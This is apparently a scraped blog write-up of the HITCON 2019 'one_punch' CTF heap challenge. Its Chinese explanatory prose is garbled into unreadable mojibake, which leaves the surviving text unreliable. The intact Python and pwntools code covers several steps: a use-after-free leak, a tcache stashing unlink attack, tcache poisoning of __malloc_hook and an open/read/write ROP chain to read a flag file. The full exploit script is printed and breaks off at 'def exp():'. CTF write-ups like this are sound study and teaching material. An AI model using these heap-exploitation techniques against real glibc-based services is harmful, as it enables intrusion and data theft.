</span></span><span class=line><span class=cl>ğŸ‘¼     One Punch Man      ğŸ‘¼
</span></span><span class=line><span class=cl>############################
</span></span><span class=line><span class=cl>#   1. debut               #
</span></span><span class=line><span class=cl>#   2. rename              #
</span></span><span class=line><span class=cl>#   3. show                #
</span></span><span class=line><span class=cl>#   4. retire              #
</span></span><span class=line><span class=cl>#   5. Exit                #
</span></span><span class=line><span class=cl>############################
</span></span></code></pre></td></tr></table></div></div><p>debutï¼šè¯»å–å­—ç¬¦ä¸²åˆ°æ ˆä¸Šï¼Œä½¿ç”¨callocåˆ†é…å¯¹åº”å¤§å°çš„chunkè¿›è¡Œå­˜å‚¨ä¸”å­˜å‚¨é•¿åº¦ã€‚è¾“å…¥å­—ç¬¦ä¸²é•¿åº¦å¿…é¡»åœ¨0x80åˆ°0x400ä¹‹é—´</p><p>renameï¼šæ›´æ”¹å­—ç¬¦ä¸²</p><p>showï¼šæ‰“å°å­—ç¬¦ä¸²</p><p>retire ï¼šé‡Šæ”¾ç©ºé—´ï¼Œä½†æ²¡æœ‰å°†æŒ‡é’ˆç½®0ï¼Œå­˜åœ¨æŒ‡é’ˆæ‚¬ç©º</p><p>åŒæ—¶å­˜åœ¨ä¸€ä¸ªåé—¨å‡½æ•°ï¼Œè¾“å…¥0xC388ï¼Œå¯ä»¥æ‰§è¡Œã€‚åé—¨å‡½æ•°åˆ¤æ–­heap_base+0x30å¤„çš„å•å­—èŠ‚æ˜¯å¦å¤§äº6ï¼Œå¤§äºåˆ™ç»§ç»­æ‰§è¡Œã€‚ä½¿ç”¨mallocåˆ†é…0x217ï¼Œç„¶åè¯»å…¥å­—ç¬¦ä¸²ã€‚æ²¡æœ‰è¢«é‡Šæ”¾ï¼Œè¿™é‡Œå­˜åœ¨å†…å­˜æ³„æ¼</p><p><strong>calloc</strong></p><p>mallocæ‰§è¡Œè¿‡ç¨‹ï¼š<code>__libc_malloc</code>-><code>_int_malloc</code></p><p>callocæ‰§è¡Œè¿‡ç¨‹ï¼š<code>__libc_calloc</code>-><code>_int_malloc</code></p><p>ä½¿ç”¨tcacheåˆ†é…å³ä¸º<code>tcache_get</code>å­˜åœ¨äº<code>__libc_malloc</code>ï¼Œè€Œ<code>_int_malloc</code>åªä¼šä½¿ç”¨<code>tcache_put</code>å¡«å……tcacheã€‚æ‰€ä»¥å¾—å‡ºä¸€èˆ¬ç»“è®ºï¼Œcallocä¸ä¼šä½¿ç”¨tcacheè¿›è¡Œåˆ†é…ã€‚</p><p>ï¼ˆæœ‰ä¾‹å¤–ï¼Œåœ¨<code>_int_malloc</code>ä¸­éå†unsorted binçš„å°¾éƒ¨å­˜åœ¨ä½¿ç”¨tcacheåˆ†é…çš„è¡Œä¸ºï¼‰</p><h3 id=æ€»ä½“æ€è·¯>æ€»ä½“æ€è·¯<a hidden class=anchor aria-hidden=true href=#æ€»ä½“æ€è·¯>#</a></h3><p>åˆ©ç”¨UAFæ³„éœ²heap baseã€libc baseã€‚</p><p>åˆ©ç”¨tcache stashing unlink attackè¦†å†™heap_base+0x30çš„ä½ç½®ã€‚è§£é™¤åé—¨å‡½æ•°çš„ä½¿ç”¨é™åˆ¶ã€‚</p><p>å¯¹0x220ï¼ˆå³<code>malloc(0x217)</code>ä½¿ç”¨ï¼‰çš„tcacheä½¿ç”¨ç±»ä¼¼fastbin attackçš„æ–¹å¼ä¿®æ”¹<code>__malloc_hook</code>ã€‚å› ä¸ºç¨‹åºä½¿ç”¨äº†seccompé™åˆ¶äº†ç³»ç»Ÿè°ƒç”¨ï¼Œæ‰€ä»¥åç»­ä½¿ç”¨ropçš„æ–¹å¼è¯»å‡ºflagã€‚<code>__malloc_hook</code>ä¿®æ”¹ä¸º<code>add rsp, 0x48; ret</code>çš„gadgetåœ°å€ï¼Œå°†rspç§»åŠ¨åˆ°debutå‡½æ•°çš„bufä½ç½®ã€‚åˆ©ç”¨debutä¸­çš„<code>read(0, buf, 0x400)</code>å°†ä¸€ç³»åˆ—ropæ“ä½œè¯»å…¥åˆ°bufé‡Œã€‚</p><h3 id=tcache-stashing-unlink-attack-1>tcache stashing unlink attack<a hidden class=anchor aria-hidden=true href=#tcache-stashing-unlink-attack-1>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>6</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0xf8</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>retire</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=nb>range</span><span class=p>(</span><span class=mi>7</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>retire</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=c1># gdb.attach(io, &#34;b *$rebase(0x16AB)&#34;)</span>
</span></span><span class=line><span class=cl><span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>debut</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>retire</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x300</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>debut</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x400</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>retire</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>debut</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x300</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>debut</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x200</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rename</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x308</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mh>0x101</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x2d20</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x1f</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;./flag&#34;</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mh>0xf8</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;</span><span class=se>\x00</span><span class=s2>&#34;</span><span class=p>))</span>	<span class=c1># trigger</span>
</span></span></code></pre></td></tr></table></div></div><p>ç›®æ ‡æ˜¯0x100ï¼Œé¦–å…ˆé‡Šæ”¾6ä¸ªè¿›tcacheã€‚ç„¶åé€šè¿‡åˆ‡å‰²unsorted binçš„æ–¹å¼ï¼Œä½¿ä¸¤ä¸ª0x100çš„chunkè¿›å…¥small binã€‚ä¿®æ”¹å€’æ•°ç¬¬äºŒä¸ªsmall binçš„bkï¼Œå°†å…¶æŒ‡å‘<code>heap_base+0x30-0x11</code>å¤„ã€‚</p><p>å¦‚æœæŒ‡å‘<code>heap_base+0x30-0x10</code>ï¼Œåˆ™ä¼šå°†0x90å†™å…¥heap_base+0x30å¤„ï¼Œ<code>cmp al, 6</code>çœ‹èµ·æ¥æ˜¯æœ‰ç¬¦å·æ¯”è¾ƒï¼Œä¼šè®¤ä¸º0x90å°äº0x6ã€‚æ‰€ä»¥åç§»ä¸€ä¸ªå­—èŠ‚ï¼Œä½†æœ‰æ—¶è¿˜æ˜¯ä¼šå› ä¸ºæœ€é«˜ä½ä¸º1è€Œggã€‚</p><h3 id=tcache-attack>tcache attack<a hidden class=anchor aria-hidden=true href=#tcache-attack>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span><span class=lnt>8
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>debut</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x217</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>debut</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=sa>b</span><span class=s2>&#34;A&#34;</span><span class=o>*</span><span class=mh>0x217</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>retire</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>retire</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rename</span><span class=p>(</span><span class=mi>1</span><span class=p>,</span> <span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=n>libc</span><span class=o>.</span><span class=n>sym</span><span class=p>[</span><span class=s2>&#34;__malloc_hook&#34;</span><span class=p>]))</span>
</span></span><span class=line><span class=cl><span class=n>backdoor</span><span class=p>(</span><span class=s2>&#34;A&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>backdoor</span><span class=p>(</span><span class=n>p64</span><span class=p>(</span><span class=n>libc_base</span><span class=o>+</span><span class=mh>0xbdfd1</span><span class=p>))</span>
</span></span></code></pre></td></tr></table></div></div><p>é‡Šæ”¾å¾—åˆ°ä¸¤ä¸ª0x220çš„å—è¿›å…¥tcacheï¼Œä¿®æ”¹ç¬¬ä¸€ä¸ªçš„tcache_entry->nextåˆ°<code>__malloc_hook</code>ã€‚ä¸¤æ¬¡åˆ†é…è·å¾—hookï¼Œä¿®æ”¹ä¸º<code>add rsp, 0x48; ret</code>çš„gadgetåœ°å€ã€‚ä¸ºä»€ä¹ˆæ˜¯0x48ï¼Œè°ƒè¯•å¯ä»¥çŸ¥é“ã€‚</p><h3 id=rop>rop<a hidden class=anchor aria-hidden=true href=#rop>#</a></h3><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># rop</span>
</span></span><span class=line><span class=cl><span class=n>poprdi</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x219c0</span>
</span></span><span class=line><span class=cl><span class=n>poprsi</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x24435</span>
</span></span><span class=line><span class=cl><span class=n>poprdx</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x1b9a</span>
</span></span><span class=line><span class=cl><span class=n>poprax</span> <span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=mh>0x37fa8</span>
</span></span><span class=line><span class=cl><span class=n>syscall</span><span class=o>=</span> <span class=n>libc_base</span> <span class=o>+</span> <span class=n>g</span><span class=p>(</span><span class=s2>&#34;syscall; ret&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## open</span>
</span></span><span class=line><span class=cl><span class=n>rops</span>  <span class=o>=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x2d30</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprax</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## read</span>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x2d30</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprax</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>0</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1>## write</span>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprsi</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>heap_base</span><span class=o>+</span><span class=mh>0x2d30</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprdx</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>20</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>poprax</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rops</span> <span class=o>+=</span> <span class=n>p64</span><span class=p>(</span><span class=n>syscall</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>ä¾æ¬¡ä½¿ç”¨openã€readã€writeç³»ç»Ÿè°ƒç”¨ï¼Œè¯»å–flagã€‚å…¶ä¸­<code>syscall; ret</code>è¿™ä¸ªgadgetï¼ŒROPgadgetè¿™ä¸ªå·¥å…·ä¸ä¼šè¿›è¡Œç”Ÿæˆï¼Œä½¿ç”¨äº†æœºå™¨ç æœç´¢çš„æ–¹å¼<code>g = lambda x :next(libc.search(asm(x)))</code>ã€‚</p><h3 id=exploit>exploit<a hidden class=anchor aria-hidden=true href=#exploit>#</a></h3><p><a href=https://github.com/clxsh/ctf_wps/blob/master/others/Hitcon2019%20one_punch/exp.py>exp</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span><span class=lnt>113
</span><span class=lnt>114
</span><span class=lnt>115
</span><span class=lnt>116
</span><span class=lnt>117
</span><span class=lnt>118
</span><span class=lnt>119
</span><span class=lnt>120
</span><span class=lnt>121
</span><span class=lnt>122
</span><span class=lnt>123
</span><span class=lnt>124
</span><span class=lnt>125
</span><span class=lnt>126
</span><span class=lnt>127
</span><span class=lnt>128
</span><span class=lnt>129
</span><span class=lnt>130
</span><span class=lnt>131
</span><span class=lnt>132
</span><span class=lnt>133
</span><span class=lnt>134
</span><span class=lnt>135
</span><span class=lnt>136
</span><span class=lnt>137
</span><span class=lnt>138
</span><span class=lnt>139
</span><span class=lnt>140
</span><span class=lnt>141
</span><span class=lnt>142
</span><span class=lnt>143
</span><span class=lnt>144
</span><span class=lnt>145
</span><span class=lnt>146
</span><span class=lnt>147
</span><span class=lnt>148
</span><span class=lnt>149
</span><span class=lnt>150
</span><span class=lnt>151
</span><span class=lnt>152
</span><span class=lnt>153
</span><span class=lnt>154
</span><span class=lnt>155
</span><span class=lnt>156
</span><span class=lnt>157
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>os</span><span class=o>=</span><span class=s2>&#34;linux&#34;</span><span class=p>,</span> <span class=n>arch</span><span class=o>=</span><span class=s2>&#34;amd64&#34;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s2>&#34;info&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>localfile</span> <span class=o>=</span> <span class=s2>&#34;./one_punch&#34;</span>
</span></span><span class=line><span class=cl><span class=n>locallibc</span> <span class=o>=</span> <span class=s2>&#34;../glibc_versions/2.29/x64_tcache/lib/libc.so.6&#34;</span>
</span></span><span class=line><span class=cl><span class=n>pf</span>      <span class=o>=</span> <span class=k>lambda</span> <span class=n>name</span><span class=p>,</span><span class=n>num</span>           <span class=p>:</span><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=n>name</span> <span class=o>+</span> <span class=s2>&#34;: 0x</span><span class=si>%x</span><span class=s2>&#34;</span> <span class=o>%</span> <span class=n>num</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>g</span>       <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>                  <span class=p>:</span><span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=n>asm</span><span class=p>(</span><span class=n>x</span><span class=p>)))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>debut</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;1&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;idx: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;hero name: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>rename</span><span class=p>(</span><span class=n>idx</span><span class=p>,</span> <span class=n>name</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;2&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;idx: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;hero name: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>name</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>show</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;3&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;idx: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>retire</span><span class=p>(</span><span class=n>idx</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=s2>&#34;4&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;idx: &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=n>idx</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>backdoor</span><span class=p>(</span><span class=n>s</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=s2>&#34;&gt; &#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=nb>str</span><span class=p>(</span><span class=mh>0xc388</span><span class=p>))</span>
</span></span><span class=line><span class=cl>    <span class=n>sleep</span><span class=p>(</span><span class=mf>0.1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>s</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>exp</span><span class=p>():</span>
